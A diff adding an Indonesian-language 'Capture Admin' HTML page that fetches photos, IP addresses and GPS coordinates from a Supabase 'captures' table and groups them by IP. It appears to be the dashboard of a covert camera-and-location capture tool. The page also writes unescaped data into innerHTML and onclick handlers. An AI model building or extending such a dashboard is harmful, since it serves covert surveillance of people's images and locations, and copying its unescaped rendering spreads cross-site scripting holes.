@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture Admin</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script src="config.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      background: #0f172a;
+      color: #fff;
+      padding: 20px;
+    }
+
+    .header {
+      max-width: 1200px;
+      margin: 0 auto 30px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+    }
+
+    .stats {
+      display: flex;
+      gap: 20px;
+    }
+
+    .stat {
+      padding: 10px 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 600;
+      color: #a855f7;
+    }
+
+    .stat-label {
+      font-size: 12px;
+      color: #64748b;
+    }
+
+    .refresh-btn {
+      padding: 10px 20px;
+      background: #a855f7;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+      transition: background 0.2s;
+    }
+
+    .refresh-btn:hover {
+      background: #9333ea;
+    }
+
+    .refresh-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 60px;
+      color: #64748b;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(168, 85, 247, 0.2);
+      border-top-color: #a855f7;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 15px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .ip-group {
+      margin-bottom: 30px;
+      background: rgba(255, 255, 255, 0.03);
+      border-radius: 16px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      overflow: hidden;
+    }
+
+    .ip-header {
+      padding: 20px;
+      background: rgba(168, 85, 247, 0.1);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .ip-info {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+
+    .ip-address {
+      font-size: 18px;
+      font-weight: 600;
+      color: #a855f7;
+      font-family: monospace;
+    }
+
+    .ip-meta {
+      display: flex;
+      gap: 20px;
+      font-size: 13px;
+      color: #94a3b8;
+    }
+
+    .ip-meta span {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .photo-count {
+      padding: 6px 14px;
+      background: rgba(168, 85, 247, 0.2);
+      border-radius: 20px;
+      font-size: 13px;
+      color: #c084fc;
+    }
+
+    .photos-grid {
+      padding: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 15px;
+    }
+
+    .photo-card {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      background: #1e293b;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .photo-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .photo-card img {
+      width: 100%;
+      aspect-ratio: 4/3;
+      object-fit: cover;
+      display: block;
+    }
+
+    .photo-time {
+      padding: 8px 12px;
+      font-size: 11px;
+      color: #94a3b8;
+      background: rgba(0, 0, 0, 0.3);
+    }
+
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.9);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .modal.active {
+      display: flex;
+    }
+
+    .modal-content {
+      max-width: 90vw;
+      max-height: 90vh;
+      position: relative;
+    }
+
+    .modal-content img {
+      max-width: 100%;
+      max-height: 80vh;
+      border-radius: 12px;
+    }
+
+    .modal-info {
+      margin-top: 15px;
+      padding: 15px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      font-size: 14px;
+      color: #cbd5e1;
+    }
+
+    .modal-info div {
+      margin-bottom: 8px;
+    }
+
+    .modal-info div:last-child {
+      margin-bottom: 0;
+    }
+
+    .modal-info strong {
+      color: #a855f7;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: -40px;
+      right: 0;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .error {
+      text-align: center;
+      padding: 60px;
+      color: #ef4444;
+    }
+
+    .empty {
+      text-align: center;
+      padding: 60px;
+      color: #64748b;
+    }
+
+    @media (max-width: 640px) {
+      .header {
+        flex-direction: column;
+        gap: 15px;
+      }
+
+      .stats {
+        width: 100%;
+        justify-content: center;
+      }
+
+      .photos-grid {
+        grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <div>
+      <h1>Capture Admin</h1>
+    </div>
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value" id="totalPhotos">-</div>
+        <div class="stat-label">Total Foto</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="totalIPs">-</div>
+        <div class="stat-label">IP Unik</div>
+      </div>
+    </div>
+    <button class="refresh-btn" onclick="loadData()" id="refreshBtn">Refresh</button>
+  </div>
+
+  <div class="container" id="container">
+    <div class="loading">
+      <div class="spinner"></div>
+      Memuat data...
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal" id="modal">
+    <div class="modal-content">
+      <button class="modal-close" onclick="closeModal()">✕</button>
+      <img id="modalImage" src="" alt="Capture">
+      <div class="modal-info" id="modalInfo"></div>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = window.SUPABASE_URL;
+    const SUPABASE_KEY = window.SUPABASE_KEY;
+
+    let allCaptures = [];
+
+    // Load data from Supabase
+    async function loadData() {
+      const container = document.getElementById("container");
+      const refreshBtn = document.getElementById("refreshBtn");
+      
+      refreshBtn.disabled = true;
+      refreshBtn.textContent = "Memuat...";
+      container.innerHTML = '<div class="loading"><div class="spinner"></div>Memuat data...</div>';
+
+      try {
+        const response = await fetch(
+          `${SUPABASE_URL}/rest/v1/captures?select=*&order=created_at.desc`,
+          {
+            headers: {
+              "Authorization": `Bearer ${SUPABASE_KEY}`,
+              "Content-Type": "application/json"
+            }
+          }
+        );
+
+        if (!response.ok) throw new Error("Failed to fetch data");
+
+        allCaptures = await response.json();
+        renderGrouped();
+
+      } catch (error) {
+        console.error("Error loading data:", error);
+        container.innerHTML = '<div class="error">Gagal memuat data. Coba lagi.</div>';
+      } finally {
+        refreshBtn.disabled = false;
+        refreshBtn.textContent = "Refresh";
+      }
+    }
+
+    // Group by IP and render
+    function renderGrouped() {
+      const container = document.getElementById("container");
+      
+      // Update stats
+      document.getElementById("totalPhotos").textContent = allCaptures.length;
+      
+      // Group by IP
+      const grouped = {};
+      allCaptures.forEach(capture => {
+        const ip = capture.ip_address || "Unknown";
+        if (!grouped[ip]) grouped[ip] = [];
+        grouped[ip].push(capture);
+      });
+
+      const uniqueIPs = Object.keys(grouped).length;
+      document.getElementById("totalIPs").textContent = uniqueIPs;
+
+      if (allCaptures.length === 0) {
+        container.innerHTML = '<div class="empty">Belum ada data capture</div>';
+        return;
+      }
+
+      // Sort by count (most photos first)
+      const sorted = Object.entries(grouped).sort((a, b) => b[1].length - a[1].length);
+
+      container.innerHTML = sorted.map(([ip, captures]) => {
+        const firstCapture = captures[captures.length - 1];
+        const lastCapture = captures[0];
+        const gps = firstCapture.latitude && firstCapture.longitude 
+          ? `${firstCapture.latitude.toFixed(6)}, ${firstCapture.longitude.toFixed(6)}`
+          : "Tidak tersedia";
+
+        const timeRange = formatDate(firstCapture.created_at) + " - " + formatTime(lastCapture.created_at);
+
+        return `
+          <div class="ip-group">
+            <div class="ip-header">
+              <div class="ip-info">
+                <div class="ip-address">${ip}</div>
+                <div class="ip-meta">
+                  <span>📍 ${gps}</span>
+                  <span>🕐 ${timeRange}</span>
+                </div>
+              </div>
+              <div class="photo-count">${captures.length} foto</div>
+            </div>
+            <div class="photos-grid">
+              ${captures.map(c => `
+                <div class="photo-card" onclick="openModal('${c.image_url}', '${ip}', '${c.created_at}', ${c.latitude || 'null'}, ${c.longitude || 'null'})">
+                  <img src="${c.image_url}" alt="Capture" loading="lazy">
+                  <div class="photo-time">${formatTime(c.created_at)}</div>
+                </div>
+              `).join("")}
+            </div>
+          </div>
+        `;
+      }).join("");
+    }
+
+    // Format date
+    function formatDate(isoString) {
+      return new Date(isoString).toLocaleDateString("id-ID", {
+        day: "numeric",
+        month: "short",
+        year: "numeric"
+      });
+    }
+
+    // Format time
+    function formatTime(isoString) {
+      return new Date(isoString).toLocaleTimeString("id-ID", {
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+    }
+
+    // Modal
+    function openModal(imageUrl, ip, timestamp, lat, lng) {
+      const modal = document.getElementById("modal");
+      const modalImage = document.getElementById("modalImage");
+      const modalInfo = document.getElementById("modalInfo");
+
+      modalImage.src = imageUrl;
+      modalInfo.innerHTML = `
+        <div><strong>IP:</strong> ${ip}</div>
+        <div><strong>Waktu:</strong> ${new Date(timestamp).toLocaleString("id-ID")}</div>
+        <div><strong>GPS:</strong> ${lat && lng ? `${lat.toFixed(6)}, ${lng.toFixed(6)}` : "Tidak tersedia"}</div>
+      `;
+
+      modal.classList.add("active");
+    }
+
+    function closeModal() {
+      document.getElementById("modal").classList.remove("active");
+    }
+
+    // Close modal on escape
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") closeModal();
+    });
+
+    // Close modal on backdrop click
+    document.getElementById("modal").addEventListener("click", (e) => {
+      if (e.target.id === "modal") closeModal();
+    });
+
+    // Initial load
+    loadData();
+  </script>
+</body>
+</html>
